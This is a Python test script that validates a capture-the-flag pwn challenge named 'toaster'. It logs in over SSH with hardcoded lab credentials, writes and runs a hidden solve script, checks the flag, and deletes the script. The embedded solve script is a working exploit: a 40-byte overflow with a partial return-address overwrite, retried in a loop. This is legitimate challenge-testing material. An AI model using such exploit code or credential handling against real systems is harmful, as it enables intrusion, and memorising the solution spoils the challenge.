from pwn import *
import argparse
import filecmp
import json
import re
import os
from time import sleep
import subprocess as sub
import paramiko
context.log_level = 'error'

def run_test(flag, connection_string=None, handout_path=None, deployment_path=None, force_reusability=False):
    result = {}
    connection_string = connection_string[0] # We only have a single connection string
    host = connection_string.split(" ")[0]
    port = connection_string.split(" ")[1]

    # If the challenge is in good working order (DEPLOYMENT_WORKING)
    try:
        # Connect via SSH to check if the service is running
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Auto-add unknown hosts to known_hosts
        ssh.connect(hostname=host, username='vuctf', password='pwnChallToaster', port=int(port))
        result["DEPLOYMENT_WORKING"] = ""
        ssh.close()
    except Exception as e:
        result["DEPLOYMENT_WORKING"] = f"SSH connection failed: {str(e)}"

    # If the deployed flag and the stored flag (pass as function parameter) match (FLAG_CORRECT)
    if result.get("DEPLOYMENT_WORKING") != "":
        result["FLAG_CORRECT"] = "Unable to check flag"
    else:
        try:
            ssh = sub.Popen([
                "sshpass", "-p", "pwnChallToaster",
                "ssh", f"vuctf@{host}", "-p", f"{port}", "-oStrictHostKeyChecking=no"
            ], stdin=sub.PIPE, stdout=sub.PIPE, universal_newlines=True, bufsize=0)


            sleep(1)

            # Create the solve script directly on the remote server using echo
            solve_script = '''from pwn import *

while True:
    io = process('./toaster')
    payload = b'A' * 40
    payload += p16(0x927d)

    io.recvuntil(b'Please give me your secret recipe')
    io.send(payload)

    out = io.recvall(timeout=2)
    
    if b'You managed to make the perfect toast' in out:
        log.success('Exploit successful!')
        flag = out.split(b': ')[1].strip()
        log.success(f'Flag: {flag.decode()}')
        break
    else:
        io.close()
            '''
                            
            ssh.stdin.write("cat > /home/vuctf/.test.py << 'EOF'\n")
            ssh.stdin.write(solve_script + "\n")
            ssh.stdin.write("EOF\n")

            ssh.stdin.write("python3 /home/vuctf/.test.py\n")
            sleep(30)

            ssh.stdin.write("rm -rf /home/vuctf/.test.py\n")

            ssh.stdin.write("echo END\n")

            for line in ssh.stdout:               
                if flag in line:
                    result["FLAG_CORRECT"] = ""
                    break
                elif 'VUCTF{' in line:
                    result["FLAG_CORRECT"] = "Found different flag: " + line.split(': ')[1].strip().decode()
                    break
                elif line == "END\n":
                    break
                else:
                    result["FLAG_CORRECT"] = "Flag not found in output"
                # print(line,end="")

            ssh.stdin.close()
            ssh.stdout.close()          
                
        except Exception as e:
            result["FLAG_CORRECT"] = f"Error during testing: {str(e)}"

    # All required handout files are present, and match the deployment (HANDOUT_CORRECT)
    if not {"toaster"}.issubset(set(os.listdir(handout_path))):
        result["HANDOUT_CORRECT"] = "Missing toaster binary in handout"
    else:   
        expected_files = ["toaster"]
        _, missmatch, _ = filecmp.cmpfiles(handout_path, deployment_path,
                                          expected_files, shallow=False)
        result["HANDOUT_CORRECT"] = ''.join(missmatch)
        
    # Assert that all credentials/flags in the handout files are invalid (DUMMY_SECRET)
    result["DUMMY_SECRET"] = grep_recursive("VUCTF{", handout_path)
    
    return result

def grep_recursive(pattern, path):
    """
    Recursively search for a pattern in all files within a given directory.

    :param pattern: The regex pattern to search for.
    :param path: The directory path to search in.
    """
    result = ""
    compiled_pattern = re.compile(pattern)
    
    for root, _, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    for line_number, line in enumerate(f, start=1):
                        if compiled_pattern.search(line):
                            result += f"{file_path}:{line_number}:{line.strip()}\n"
            except Exception as e:
                print(f"Error reading {file_path}: {e}")
    
    return result

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Run the test with specified arguments.")
    parser.add_argument("--flag", type=str, required=True, help="The flag to run the test.")
    parser.add_argument("--connection-string", type=str, required=True, action='append',
                        help="The connection string in the form: \"<ip/hostname> <port>\"" +
                        "an example includes: --connection-string \"localhost 1337\" or" +
                        "--connection-string \"172.18.0.1 6564\"")
    parser.add_argument("--handout-path", type=str, required=True, help="The path" +
                        " to the /Handout dir of the challenge.")
    parser.add_argument("--deployment-path", type=str, required=True, help="The " +
                        "path to the /Source directory of this challenge.")
    parser.add_argument("--force-reusability", action="store_true", help="This " +
                        "flag is used when testing the challenge before it is given to the player."
                        "After test is run with this flag, no artifacts should be left around" +
                        "that can affect the players experience")
    args = parser.parse_args()
    
    print(json.dumps(
        run_test(
            flag=args.flag,
            connection_string=args.connection_string,
            handout_path=args.handout_path,
            deployment_path=args.deployment_path,
            force_reusability=args.force_reusability
        )
    ))
